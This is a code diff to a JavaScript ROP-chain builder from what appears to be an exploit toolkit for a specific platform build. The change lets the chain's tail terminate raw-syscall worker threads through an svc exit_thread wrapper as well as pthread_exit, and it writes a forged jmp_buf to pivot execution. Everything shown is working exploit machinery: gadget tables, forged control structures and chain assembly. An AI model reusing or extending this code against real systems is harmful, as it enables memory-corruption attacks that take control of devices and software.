@@ -118,7 +118,12 @@ function buildRop(base, live, calls, jmpBuf, gadgets) {
       throw Error('ropchain worker backend lacks gadget: ' + name +
         ' (fill gadgets.' + name + ' in offsets/civ7-100.json, main-module-relative)');
   if (!live.sdkFn?.memcpy) throw Error('ropchain dynamic arguments need sdk_offsets.memcpy');
-  if (!live.sdkFn?.pthread_exit) throw Error('ropchain tail needs sdk_offsets.pthread_exit');
+  // barbarism: the chain tail must terminate the worker thread. Raw svc
+  // threads (rawsvc backend) have no musl TCB, so their tail is the
+  // svc #0x0A wrapper (svc.exit_thread); pthread-backed chains keep
+  // pthread_exit. Callers pass live.workerExit to override.
+  const workerExit = live.workerExit || live.sdkFn?.pthread_exit;
+  if (!workerExit) throw Error('ropchain tail needs sdk_offsets.pthread_exit (or live.workerExit for rawsvc)');
   if (!jmpBuf?.fields || !Number.isInteger(jmpBuf.size))
     throw Error('ropchain needs a parsed jmp_buf layout (offsets/civ7-100.json jmp_buf)');
   const sdkBytes = live.sdkSize || 0x8000000;
@@ -205,7 +210,7 @@ function buildRop(base, live, calls, jmpBuf, gadgets) {
   put(tail + 0x60, base + cellAt(count));
   put(tail + 0x68, 0);
   put(cellAt(count), base + cellAt(count) + 8);
-  put(cellAt(count) + 0x20, live.sdkFn.pthread_exit);
+  put(cellAt(count) + 0x20, workerExit);
 
   // Forged jmp_buf: land on args_loader of call 0 with sp on the first frame's
   // argument block. Every field the layout names is written (zero unless set)
